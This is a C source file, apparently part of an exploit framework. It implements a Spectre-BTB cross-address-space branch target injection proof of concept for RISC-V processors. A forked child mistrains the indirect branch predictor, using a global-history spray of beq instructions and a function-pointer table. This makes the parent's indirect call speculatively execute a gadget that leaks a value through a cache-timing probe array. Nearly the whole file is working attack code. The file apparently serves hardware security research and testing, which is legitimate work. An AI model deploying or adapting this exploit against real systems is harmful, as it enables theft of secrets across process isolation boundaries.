#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"
#include <sys/mman.h>

// BTB ca-ip: cross-address via fork, uses table+STALL approach

typedef void (*target_t)(void);
target_t __attribute__((aligned(4096))) table[1024];

uint8_t* probe_array;
volatile uint8_t current_encode_value;

// GHR spray: fill global history register with taken branches
volatile int spray_cond = 1;
#define BEQ asm volatile("beq %0, %1, 1f\n1:" : : "r"(spray_cond), "r"(1));
#define BEQ_8 BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ

static inline void ghr_spray(void) {
    BEQ_8
}

void __attribute__((noinline)) target(void) {
    SPEC_FENCE();
    maccess(probe_array + current_encode_value * PAGE_SIZE);
}

void __attribute__((noinline)) dummy(void) {
    maccess(probe_array + 0x01 * PAGE_SIZE);
}

#ifdef P550
void __attribute__((noinline, aligned(65536))) accessor(int idx) {
    table[STALL(idx)]();
}
#else
void __attribute__((noinline)) accessor(int idx) {
    table[STALL(idx)]();
}
#endif

typedef struct {
    int dummy_field;
} btb_data_t;

void btb_ca_setup(exploit_ctx_t* ctx, void* data) {
    table[0] = dummy;
    table[256] = target;

    ctx->exclude_enabled = true;
    ctx->exclude_value = 0x01;
}

void btb_ca_child_loop(exploit_ctx_t* ctx, void* data) {
    // Child: mistrains IBP - accessor(256) -> target
    // This should poison the IBP entry for parent's accessor(0)
    current_encode_value = 0x01;
    mfence();
    for (int j = 0; j < 1000; j++) {
        ghr_spray();
        accessor(256);  // Train: jr a5 -> target
    }
}

void btb_ca_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    // Parent: victim - accessor(0) should mispredict to target
    for (int m = 0; m < 1500; m++) {
        current_encode_value = encode_index;
        mfence();
        ghr_spray();  // Same GHR state as child
        accessor(0);  // Should mispredict to target, leak encode_index
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    btb_data_t btb_data = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-BTB ca-ip\n");

    exploit_hooks_t hooks = {
        .setup = btb_ca_setup,
        .child_loop = btb_ca_child_loop,
        .parent_attack = btb_ca_parent_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, &btb_data);
    exploit_print_results("BTB cross-address in-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
